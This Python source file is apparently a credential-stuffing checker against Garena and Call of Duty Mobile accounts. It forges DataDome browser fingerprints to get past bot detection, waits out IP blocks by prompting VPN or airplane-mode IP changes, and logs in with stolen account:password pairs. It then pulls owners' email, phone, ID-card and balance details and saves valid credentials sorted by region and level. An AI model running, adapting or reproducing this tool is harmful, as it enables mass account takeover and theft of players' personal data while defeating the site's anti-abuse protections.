import os
import sys
import time
import random
import hashlib
import json
import logging
import urllib.parse
import signal
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from threading import Lock
from Crypto.Cipher import AES
import requests
import cloudscraper
import colorama
import threading
from colorama import Fore, Style, Back
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.box import Box, DOUBLE
from rich.live import Live
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn

colorama.init(autoreset=True)

console = Console()

class Colors:
    LIGHTGREEN_EX = colorama.Fore.LIGHTGREEN_EX
    WHITE = colorama.Fore.WHITE
    BLUE = colorama.Fore.BLUE
    GREEN = colorama.Fore.GREEN
    RED = colorama.Fore.RED
    CYAN = colorama.Fore.CYAN
    LIGHTBLACK_EX = colorama.Fore.LIGHTBLACK_EX
    RESET = colorama.Style.RESET_ALL 

class ColoredFormatter(logging.Formatter):
    COLORS = {
        'DEBUG': colorama.Fore.BLUE + colorama.Back.WHITE,
        'INFO': colorama.Fore.WHITE,
        'WARNING': colorama.Fore.YELLOW,
        'ERROR': colorama.Fore.RED,
        'CRITICAL': colorama.Fore.RED + colorama.Back.WHITE,
        'ORANGE': '\033[38;5;214m',
        'PURPLE': '\033[95m',
        'CYAN': '\033[96m',
        'SUCCESS': '\033[92m',
        'FAIL': '\033[91m'
    }

    RESET = colorama.Style.RESET_ALL

    def format(self, record):
        levelname = record.levelname
        if levelname in self.COLORS:
            record.msg = f"{self.COLORS[levelname]}{record.msg}{self.RESET}"
        return super().format(record)

logger = logging.getLogger()
handler = logging.StreamHandler()
handler.setFormatter(ColoredFormatter())
logger.addHandler(handler)
logger.setLevel(logging.DEBUG)

logging.getLogger("urllib3").setLevel(logging.ERROR)
logging.getLogger("requests").setLevel(logging.ERROR)

class GracefulThreadPoolExecutor(ThreadPoolExecutor):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._shutdown = False
        
    def shutdown(self, wait=True, *, cancel_futures=False):
        self._shutdown = True
        super().shutdown(wait=wait, cancel_futures=cancel_futures)

class CookieManager:
    def __init__(self):
        self.banned_cookies = set()
        self.load_banned_cookies()
        
    def load_banned_cookies(self):
        if os.path.exists('banned_cookies.txt'):
            with open('banned_cookies.txt', 'r') as f:
                self.banned_cookies = set(line.strip() for line in f if line.strip())
    
    def is_banned(self, cookie):
        return cookie in self.banned_cookies
    
    def mark_banned(self, cookie):
        self.banned_cookies.add(cookie)
        with open('banned_cookies.txt', 'a') as f:
            f.write(cookie + '\n')
    
    def get_valid_cookies(self): 
        valid_cookies = []
        if os.path.exists('fresh_cookie.txt'):
            with open('fresh_cookie.txt', 'r') as f:
                valid_cookies = [c.strip() for c in f.read().splitlines() 
                               if c.strip() and not self.is_banned(c.strip())]
        random.shuffle(valid_cookies)
        return valid_cookies
    
    def save_cookie(self, datadome_value):
        formatted_cookie = f"datadome={datadome_value.strip()}" 
        if not self.is_banned(formatted_cookie):
            existing_cookies = set()
            if os.path.exists('fresh_cookie.txt'):
                with open('fresh_cookie.txt', 'r') as f:
                    existing_cookies = set(line.strip() for line in f if line.strip())
                    
            if formatted_cookie not in existing_cookies:
                with open('fresh_cookie.txt', 'a') as f:
                    f.write(formatted_cookie + '\n')
                return True
            return False 
        return False

class DataDomeManager:
    def __init__(self):
        self.current_datadome = None
        self.datadome_history = []
        self._403_attempts = 0
        
    def set_datadome(self, datadome_cookie):
        if datadome_cookie and datadome_cookie != self.current_datadome:
            self.current_datadome = datadome_cookie
            self.datadome_history.append(datadome_cookie)
            if len(self.datadome_history) > 10:
                self.datadome_history.pop(0)
            
    def get_datadome(self):
        return self.current_datadome
        
    def extract_datadome_from_session(self, session):
        try:
            cookies_dict = session.cookies.get_dict()
            datadome_cookie = cookies_dict.get('datadome')
            if datadome_cookie:
                self.set_datadome(datadome_cookie)
                return datadome_cookie
            return None
        except Exception as e:
            logger.warning(f"[WARNING] Error extracting datadome from session: {e}")
            return None
        
    def clear_session_datadome(self, session):
        try:
            if 'datadome' in session.cookies:
                del session.cookies['datadome']
        except Exception as e:
            logger.warning(f"[WARNING] Error clearing datadome cookies: {e}")
        
    def set_session_datadome(self, session, datadome_cookie=None):
        try:
            self.clear_session_datadome(session)
            cookie_to_use = datadome_cookie or self.current_datadome
            if cookie_to_use:
                session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
                return True
            return False
        except Exception as e:
            logger.warning(f"[WARNING] Error setting datadome cookie: {e}")
            return False

    def get_current_ip(self):
        ip_services = [
            'https://api.ipify.org',
            'https://icanhazip.com',
            'https://ident.me',
            'https://checkip.amazonaws.com'
        ]
        
        for service in ip_services:
            try:
                response = requests.get(service, timeout=10)
                if response.status_code == 200:
                    ip = response.text.strip()
                    if ip and '.' in ip:  
                        return ip
            except Exception:
                continue
        
        logger.warning(f"[WARNING] Could not fetch IP from any service")
        return None

    def wait_for_ip_change(self, session, check_interval=5, max_wait_time=200):
        logger.info(f"[𝙄𝙉𝙁𝙊] Auto-detecting IP change...")
        
        original_ip = self.get_current_ip()
        if not original_ip:
            logger.warning(f"[WARNING] Could not determine current IP, waiting 60 seconds")
            time.sleep(10)
            return True
            
        logger.info(f"[𝙄𝙉𝙁𝙊] Current IP: {original_ip}")
        logger.info(f"[𝙄𝙉𝙁𝙊] Waiting for IP change (checking every {check_interval} seconds, max {max_wait_time//60} minutes)...")
        
        start_time = time.time()
        attempts = 0
        
        while time.time() - start_time < max_wait_time:
            attempts += 1
            current_ip = self.get_current_ip()
            
            if current_ip and current_ip != original_ip:
                logger.info(f"[SUCCESS] IP changed from {original_ip} to {current_ip}")
                logger.info(f"[𝙄𝙉𝙁𝙊] IP changed successfully after {attempts} checks!")
                return True
            else:
                if attempts % 5 == 0:  
                    logger.info(f"[𝙄𝙉𝙁𝙊] IP check {attempts}: Still {original_ip} -> Auto-retrying...")
                time.sleep(check_interval)
        
        logger.warning(f"[WARNING] IP did not change after {max_wait_time} seconds")
        return False

    def handle_403(self, session):
        self._403_attempts += 1
        
        if self._403_attempts >= 3:
            logger.error(f"[ERROR] IP blocked after 3 attempts.")
            logger.error(f"[𝙄𝙉𝙁𝙊] Network fix: WiFi -> Use VPN | Mobile Data -> Toggle Airplane Mode")
            logger.info(f"[𝙄𝙉𝙁𝙊] Auto-detecting IP change...")
            
            if self.wait_for_ip_change(session):
                logger.info(f"[SUCCESS] IP changed, fetching new DataDome cookie...")
                
                self._403_attempts = 0
                
                new_datadome = get_datadome_cookie(session)
                if new_datadome:
                    self.set_datadome(new_datadome)
                    logger.info(f"[SUCCESS] New DataDome cookie obtained")
                    return True
                else:
                    logger.error(f"[ERROR] Failed to fetch new DataDome after IP change")
                    return False
            else:
                logger.error(f"[ERROR] IP did not change, cannot continue")
                return False
        return False

class LiveStats:
    def __init__(self):
        self.valid_count = 0
        self.invalid_count = 0
        self.clean_count = 0
        self.not_clean_count = 0
        self.has_codm_count = 0
        self.no_codm_count = 0
        self.lock = threading.Lock()
        
    def update_stats(self, valid=False, clean=False, has_codm=False):
        with self.lock:
            if valid:
                self.valid_count += 1
            else:
                self.invalid_count += 1
            if clean:
                self.clean_count += 1
            else:
                self.not_clean_count += 1
            if has_codm:
                self.has_codm_count += 1
            else:
                if valid:
                    self.no_codm_count += 1
                
    def get_stats(self):
        with self.lock:
            return {
                'valid': self.valid_count,
                'invalid': self.invalid_count,
                'clean': self.clean_count,
                'not_clean': self.not_clean_count,
                'has_codm': self.has_codm_count,
                'no_codm': self.no_codm_count
            }
            
    def display_stats(self):
        stats = self.get_stats()
        bright_blue = '\033[94m'
        reset_color = '\033[0m'
        return f"{bright_blue}[LIVE STATS] VALID [{stats['valid']}] | INVALID [{stats['invalid']}] | CLEAN [{stats['clean']}] | NOT CLEAN [{stats['not_clean']}] | HAS CODM [{stats['has_codm']}] | NO CODM [{stats['no_codm']}] -> config @LEGITYAMI {reset_color}"


def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def applyck(session, cookie_str):
    session.cookies.clear()
    cookie_dict = {}
    for item in cookie_str.split(";"):
        item = item.strip()
        if '=' in item:
            try:
                key, value = item.split("=", 1)
                key = key.strip()
                value = value.strip()
                if key and value:
                    cookie_dict[key] = value
            except (ValueError, IndexError):
                logger.warning(f"[WARNING] Skipping invalid cookie component: {item}")
        else:
            logger.warning(f"[WARNING] Skipping malformed cookie (no '='): {item}")
    
    if cookie_dict:
        session.cookies.update(cookie_dict)
        logger.info(f"[SUCCESS] Applied {len(cookie_dict)} cookies")
    else:
        logger.warning(f"[WARNING] No valid cookies found in the provided string")

def get_datadome_cookie(session):
    url = 'https://dd.garena.com/js/'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    }
    
    payload = {
        'jsData': json.dumps({
            "ttst":76.70000004768372,"ifov":False,"hc":4,"br_oh":824,"br_ow":1536,"ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36","wbd":False,"dp0":True,"tagpu":5.738121195951787,"wdif":False,"wdifrm":False,"npmtm":False,"br_h":738,"br_w":260,"isf":False,"nddc":1,"rs_h":864,"rs_w":1536,"rs_cd":24,"phe":False,"nm":False,"jsf":False,"lg":"en-US","pr":1.25,"ars_h":824,"ars_w":1536,"tz":-480,"str_ss":True,"str_ls":True,"str_idb":True,"str_odb":False,"plgod":False,"plg":5,"plgne":True,"plgre":True,"plgof":False,"plggt":False,"pltod":False,"hcovdr":False,"hcovdr2":False,"plovdr":False,"plovdr2":False,"ftsovdr":False,"ftsovdr2":False,"lb":False,"eva":33,"lo":False,"ts_mtp":0,"ts_tec":False,"ts_tsa":False,"vnd":"Google Inc.","bid":"NA","mmt":"application/pdf,text/pdf","plu":"PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF","hdn":False,"awe":False,"geb":False,"dat":False,"med":"defined","aco":"probably","acots":False,"acmp":"probably","acmpts":True,"acw":"probably","acwts":False,"acma":"maybe","acmats":False,"acaa":"probably","acaats":True,"ac3":"","ac3ts":False,"acf":"probably","acfts":False,"acmp4":"maybe","acmp4ts":False,"acmp3":"probably","acmp3ts":False,"acwm":"maybe","acwmts":False,"ocpt":False,"vco":"","vcots":False,"vch":"probably","vchts":True,"vcw":"probably","vcwts":True,"vc3":"maybe","vc3ts":False,"vcmp":"","vcmpts":False,"vcq":"maybe","vcqts":False,"vc1":"probably","vc1ts":True,"dvm":8,"sqt":False,"so":"landscape-primary","bda":False,"wdw":True,"prm":True,"tzp":True,"cvs":True,"usb":True,"cap":True,"tbf":False,"lgs":True,"tpd":True
        }),
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '4.35.4'
    }

    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())

    try:
        response = requests.post(url, headers=headers, data=data)
        response.raise_for_status()
        response_json = response.json()
        
        if response_json['status'] == 200 and 'cookie' in response_json:
            cookie_string = response_json['cookie']
            datadome = cookie_string.split(';')[0].split('=')[1]
            return datadome
        else:
            print(f"DataDome cookie not found in response. Status code: {response_json['status']}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"Error getting DataDome cookie: {e}")
        return None

def prelogin(session, account, datadome_manager):
    url = 'https://sso.garena.com/api/prelogin'
    params = {
        'app_id': '10100',
        'account': account,
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    
    retries = 3
    for attempt in range(retries):
        try:
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
            
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br, zstd',
                'accept-language': 'en-US,en;q=0.9',
                'connection': 'keep-alive',
                'host': 'sso.garena.com',
                'referer': f'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account={account}',
                'sec-ch-ua': '"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
            }
            
            if cookie_header:
                headers['cookie'] = cookie_header
            
            logger.info(f"[PRELOGIN] Attempt {attempt + 1}/{retries} for {account}")
            
            response = session.get(url, headers=headers, params=params, timeout=30)
            
            new_cookies = {}
            
            if 'set-cookie' in response.headers:
                set_cookie_header = response.headers['set-cookie']
                
                for cookie_str in set_cookie_header.split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                new_cookies[cookie_name] = cookie_value
                        except Exception as e:
                            pass
            
            try:
                response_cookies = response.cookies.get_dict()
                for cookie_name, cookie_value in response_cookies.items():
                    if cookie_name not in new_cookies:
                        new_cookies[cookie_name] = cookie_value
            except Exception as e:
                pass
            
            for cookie_name, cookie_value in new_cookies.items():
                if cookie_name in ['datadome', 'apple_state_key', 'sso_key']:
                    session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
                    if cookie_name == 'datadome':
                        datadome_manager.set_datadome(cookie_value)
            
            new_datadome = new_cookies.get('datadome')
            
            if response.status_code == 403:
                logger.error(f"[ERROR] 403 Forbidden during prelogin for {account} (attempt {attempt + 1}/{retries})")
                
                if new_cookies and attempt < retries - 1:
                    logger.info(f"[RETRY] Got new cookies from 403, retrying...")
                    time.sleep(2)
                    continue
                
                if datadome_manager.handle_403(session):
                    return "IP_BLOCKED", None, None
                else:
                    logger.error(f"[ERROR] Cannot continue with {account} due to IP block")
                    return None, None, new_datadome
                
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None, None, new_datadome
            
            response.raise_for_status()
            
            try:
                data = response.json()
            except json.JSONDecodeError:
                logger.error(f"[ERROR] Invalid JSON response from prelogin for {account}")
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None, None, new_datadome
            
            if 'error' in data:
                logger.error(f"[ERROR] Prelogin error for {account}: {data['error']}")
                return None, None, new_datadome
                
            v1 = data.get('v1')
            v2 = data.get('v2')
            
            if not v1 or not v2:
                logger.error(f"[ERROR] Missing v1 or v2 in prelogin response for {account}")
                return None, None, new_datadome
                
            logger.info(f"[SUCCESS] Prelogin successful: {account}")
            
            return v1, v2, new_datadome
            
        except requests.exceptions.HTTPError as e:
            if hasattr(e, 'response') and e.response is not None:
                if e.response.status_code == 403:
                    logger.error(f"[ERROR] 403 Forbidden during prelogin for {account} (attempt {attempt + 1}/{retries})")
                    
                    new_cookies = {}
                    if 'set-cookie' in e.response.headers:
                        set_cookie_header = e.response.headers['set-cookie']
                        for cookie_str in set_cookie_header.split(','):
                            if '=' in cookie_str:
                                try:
                                    cookie_name = cookie_str.split('=')[0].strip()
                                    cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                                    if cookie_name and cookie_value:
                                        new_cookies[cookie_name] = cookie_value
                                        session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
                                        if cookie_name == 'datadome':
                                            datadome_manager.set_datadome(cookie_value)
                                except Exception as ex:
                                    pass
                    
                    if new_cookies and attempt < retries - 1:
                        logger.info(f"[RETRY] Retrying with new cookies from 403...")
                        time.sleep(2)
                        continue
                    
                    if datadome_manager.handle_403(session):
                        return "IP_BLOCKED", None, None
                    else:
                        logger.error(f"[ERROR] Cannot continue with {account} due to IP block")
                        return None, None, new_cookies.get('datadome')
                        
                    if attempt < retries - 1:
                        time.sleep(2)
                        continue
                    return None, None, new_cookies.get('datadome')
                else:
                    logger.error(f"[ERROR] HTTP error {e.response.status_code} fetching prelogin data for {account} (attempt {attempt + 1}/{retries}): {e}")
            else:
                logger.error(f"[ERROR] HTTP error fetching prelogin data for {account} (attempt {attempt + 1}/{retries}): {e}")
                
            if attempt < retries - 1:
                time.sleep(2)
                continue
        except Exception as e:
            logger.error(f"[ERROR] Error fetching prelogin data for {account} (attempt {attempt + 1}/{retries}): {e}")
            if attempt < retries - 1:
                time.sleep(2)
                
    return None, None, None

def login(session, account, password, v1, v2):
    hashed_password = hash_password(password, v1, v2)
    url = 'https://sso.garena.com/api/login'
    params = {
        'app_id': '10100',
        'account': account,
        'password': hashed_password,
        'redirect_uri': 'https://account.garena.com/',
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    
    current_cookies = session.cookies.get_dict()
    cookie_parts = []
    for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
        if cookie_name in current_cookies:
            cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
    cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
    
    headers = {
        'accept': 'application/json, text/plain, */*',
        'referer': 'https://account.garena.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
    }
    
    if cookie_header:
        headers['cookie'] = cookie_header
    
    retries = 3
    for attempt in range(retries):
        try:
            response = session.get(url, headers=headers, params=params, timeout=30)
            response.raise_for_status()
            
            login_cookies = {}
            
            if 'set-cookie' in response.headers:
                set_cookie_header = response.headers['set-cookie']
                for cookie_str in set_cookie_header.split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                login_cookies[cookie_name] = cookie_value
                        except Exception as e:
                            pass
            
            try:
                response_cookies = response.cookies.get_dict()
                for cookie_name, cookie_value in response_cookies.items():
                    if cookie_name not in login_cookies:
                        login_cookies[cookie_name] = cookie_value
            except Exception as e:
                pass
            
            for cookie_name, cookie_value in login_cookies.items():
                if cookie_name in ['sso_key', 'apple_state_key', 'datadome']:
                    session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
            
            try:
                data = response.json()
            except json.JSONDecodeError:
                logger.error(f"[ERROR] Invalid JSON response from login for {account}")
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None
            
            sso_key = login_cookies.get('sso_key') or response.cookies.get('sso_key')
            
            if 'error' in data:
                error_msg = data['error']
                logger.error(f"[ERROR] Login failed for {account}: {error_msg}")
                
                if error_msg == 'ACCOUNT DOESNT EXIST':
                    logger.warning(f"[WARNING] Authentication error - likely invalid credentials for {account}")
                    return None
                elif 'captcha' in error_msg.lower():
                    logger.warning(f"[WARNING] Captcha required for {account}")
                    time.sleep(3)
                    continue
                    
            return sso_key
            
        except requests.RequestException as e:
            logger.error(f"[ERROR] Login request failed for {account} (attempt {attempt + 1}): {e}")
            if attempt < retries - 1:
                time.sleep(2)
                
    return None

def get_codm_access_token(session):
    try:
        random_id = str(int(time.time() * 1000))
        token_url = "https://auth.garena.com/oauth/token/grant"
        token_headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"
        }
        token_data = "client_id=100082&response_type=token&redirect_uri=https%3A%2F%2Fauth.codm.garena.com%2Fauth%2Fauth%2Fcallback_n%3Fsite%3Dhttps%3A%2F%2Fapi-delete-request.codm.garena.co.id%2Foauth%2Fcallback%2F&format=json&id=" + random_id
        
        token_response = session.post(token_url, headers=token_headers, data=token_data)
        token_data = token_response.json()
        return token_data.get("access_token", "")
    except Exception as e:
        logger.error(f"[ERROR] Error getting CODM access token: {e}")
        return ""

def process_codm_callback(session, access_token):
    try:
        codm_callback_url = f"https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/&access_token={access_token}"
        callback_headers = {
            "authority": "auth.codm.garena.com",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "referer": "https://auth.garena.com/",
            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-site",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        callback_response = session.get(codm_callback_url, headers=callback_headers, allow_redirects=False)
        
        api_callback_url = f"https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}"
        api_callback_headers = {
            "authority": "api-delete-request.codm.garena.co.id",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "referer": "https://auth.garena.com/",
            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "cross-site",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        api_callback_response = session.get(api_callback_url, headers=api_callback_headers, allow_redirects=False)
        location = api_callback_response.headers.get("Location", "")
        
        if "err=3" in location:
            return None, "no_codm"
        elif "token=" in location:
            token = location.split("token=")[-1].split('&')[0]
            return token, "success"
        else:
            return None, "unknown_error"
            
    except Exception as e:
        logger.error(f"[ERROR] Error processing CODM callback: {e}")
        return None, "error"

def get_codm_user_info(session, token):
    try:
        check_login_url = "https://api-delete-request.codm.garena.co.id/oauth/check_login/"
        check_headers = {
            "authority": "api-delete-request.codm.garena.co.id",
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "accept-encoding": "gzip, deflate, br, zstd",
            "cache-control": "no-cache",
            "codm-delete-token": token,
            "origin": "https://delete-request.codm.garena.co.id",
            "pragma": "no-cache",
            "referer": "https://delete-request.codm.garena.co.id/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        }
        
        check_response = session.get(check_login_url, headers=check_headers)
        check_data = check_response.json()
        
        user_data = check_data.get("user", {})
        if user_data:
            return {
                "codm_nickname": user_data.get("codm_nickname", "N/A"),
                "codm_level": user_data.get("codm_level", "N/A"),
                "region": user_data.get("region", "N/A"),
                "uid": user_data.get("uid", "N/A"),
                "open_id": user_data.get("open_id", "N/A"),
                "t_open_id": user_data.get("t_open_id", "N/A")
            }
        return {}
        
    except Exception as e:
        logger.error(f"❌ Error getting CODM user info: {e}")
        return {}

def check_codm_account(session, account):
    codm_info = {}
    has_codm = False
    
    try:
        access_token = get_codm_access_token(session)
        if not access_token:
            logger.warning(f"⚠️ No CODM access token for {account}")
            return has_codm, codm_info
        
        codm_token, status = process_codm_callback(session, access_token)
        
        if status == "no_codm":
            logger.info(f"⚠️ No CODM detected for {account}")
            return has_codm, codm_info
        elif status != "success" or not codm_token:
            logger.warning(f"⚠️ CODM callback failed for {account}: {status}")
            return has_codm, codm_info
        
        codm_info = get_codm_user_info(session, codm_token)
        if codm_info:
            has_codm = True
            logger.info(f"✅ CODM detected for {account}: Level {codm_info.get('codm_level', 'N/A')}")
            
    except Exception as e:
        logger.error(f"❌ Error checking CODM for {account}: {e}")
    
    return has_codm, codm_info

def display_codm_info(account_details, codm_info):
    if not codm_info:
        return ""
    
    if isinstance(account_details, str):
        account_details = {
            'username': account_details,
            'nickname': 'N/A',
            'email': account_details,
            'personal': {
                'mobile_no': 'N/A',
                'country': 'N/A',
                'id_card': 'N/A'
            },
            'bind_status': 'N/A',
            'security_status': 'N/A',
            'profile': {
                'shell_balance': 'N/A'
            },
            'status': {
                'account_status': 'N/A'
            },
            'game_info': []
        }

    display_text = (
        f"╔══ Account Details\n"
        f"║   ╠══ Username: {account_details.get('username', 'N/A')}\n"
        f"║   ╠══ Nickname: {account_details.get('nickname', 'N/A')}\n"
        f"║   ╠══ Email: {account_details.get('email', 'N/A')}\n"
        f"║   ╠══ Phone: {account_details['personal'].get('mobile_no', 'N/A')}\n"
        f"║   ╠══ Country: {account_details['personal'].get('country', 'N/A')}\n"
        f"║   ╠══ ID Card: {account_details['personal'].get('id_card', 'N/A')}\n"
        f"║   ╠══ Bind Status: {account_details.get('bind_status', 'N/A')}\n"
        f"║   ╠══ Security: {account_details.get('security_status', 'N/A')}\n"
        f"║   ╠══ Shell Balance: {account_details['profile'].get('shell_balance', 'N/A')}\n"
        f"║   ╚══ Account Status: {account_details['status'].get('account_status', 'N/A')}\n"
        f"║       ╔══ CODM Info\n"
        f"║       ║   ╠══ Nickname: {codm_info.get('codm_nickname', 'N/A')}\n"
        f"║       ║   ╠══ Level: {codm_info.get('codm_level', 'N/A')}\n"
        f"║       ║   ╠══ Region: {codm_info.get('region', 'N/A')}\n"
        f"║       ║   ╠══ UID: {codm_info.get('uid', 'N/A')}\n"
        f"║       ║   ╚══ Checked By @LEGIThea\n"
        f"║       ╚════════════════════════"
    )

    return display_text

def save_codm_account(account, password, codm_info, country='N/A'):
    try:
        if not codm_info:
            return
            
        codm_level = int(codm_info.get('codm_level', 0))
        region = codm_info.get('region', 'N/A').upper()
        nickname = codm_info.get('codm_nickname', 'N/A')
        
        if isinstance(country, dict):
            country_code = country.get('country', 'N/A').upper() if country.get('country') else region
        else:
            country_code = country.upper() if country and country != 'N/A' else region
            
        if country_code == 'N/A':
            country_code = 'UNKNOWN'

        if codm_level <= 50:
            level_range = "1-50"
        elif codm_level <= 100:
            level_range = "51-100"
        elif codm_level <= 150:
            level_range = "101-150"
        elif codm_level <= 200:
            level_range = "151-200"
        elif codm_level <= 250:
            level_range = "201-250"
        elif codm_level <= 300:
            level_range = "251-300"
        elif codm_level <= 350:
            level_range = "301-350"
        else:
            level_range = "351-400"

        os.makedirs('Results', exist_ok=True)
        level_file = os.path.join('Results', f"{country_code}_{level_range}_accounts.txt")
        
        account_exists = False
        if os.path.exists(level_file):
            with open(level_file, "r", encoding="utf-8") as f:
                existing_content = f.read()
                if account in existing_content:
                    account_exists = True
        
        if not account_exists:
            with open(level_file, "a", encoding="utf-8") as f:
                if account and password:
                    f.write(f"{account}:{password} | Level: {codm_level} | Nickname: {nickname} | Region: {region} | UID: {codm_info.get('uid', 'N/A')}\n")
                    logger.info(f"[SUCCESS] Saved CODM account: {account} (Level {codm_level})")
                else:
                    logger.info(f"[INFO] Skipping CODM save for {account}: missing account or password")
        else:
            logger.info(f"[INFO] CODM account {account} already exists in {level_file}, skipping duplicate\n")
            
    except Exception as e:
        logger.error(f"[ERROR] Error saving CODM account {account}: {e}")


